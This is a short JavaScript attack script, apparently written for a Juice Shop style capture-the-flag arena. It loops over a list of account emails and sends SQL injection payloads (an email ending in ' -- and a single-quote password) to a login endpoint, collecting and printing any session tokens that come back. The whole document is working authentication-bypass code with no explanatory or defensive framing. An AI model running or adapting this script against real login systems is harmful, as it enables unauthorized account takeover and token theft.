
```js
const emails = [
  "admin@cecyber-ctf.op",
  "jim@cecyber-ctf.op",
  "bender@cecyber-ctf.op",
  "bjoern.kimminich@gmail.com",
  "ciso@cecyber-ctf.op",
  "support@cecyber-ctf.op",
  "morty@cecyber-ctf.op",
  "mc.safesearch@cecyber-ctf.op",
  "J12934@cecyber-ctf.op",
  "wurstbrot@cecyber-ctf.op",
  "amy@cecyber-ctf.op",
  "bjoern@cecyber-ctf.op",
  "bjoern@owasp.org",
  "accountant@cecyber-ctf.op",
  "uvogin@cecyber-ctf.op",
  "demo",
  "kyebn@ty86.im",
  "' ",
  "teste@teste.com",
  "teste1@teste.com"
];

const results = [];

async function tryLogin(email) {
  try {
    const res = await fetch("https://arena.cecyber.com/rest/user/login", {
      method: "POST",
      headers: {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json"
      },
      body: JSON.stringify({
        email: `${email}' --`,
        password: "'"
      })
    });

    if (!res.ok) return;

    const data = await res.json();

    if (data.authentication && data.authentication.token) {
      results.push({
        email: email,
        token: data.authentication.token
      });
      console.log("✅ Sucesso:", email, data.authentication.token);
    } else {
      console.log("❌ Falhou:", email);
    }
  } catch (err) {
    console.error("Erro em:", email, err);
  }
}

(async () => {
  for (const email of emails) {
    await tryLogin(email);
  }
  console.log("📌 Resultados finais:", results);
})();
```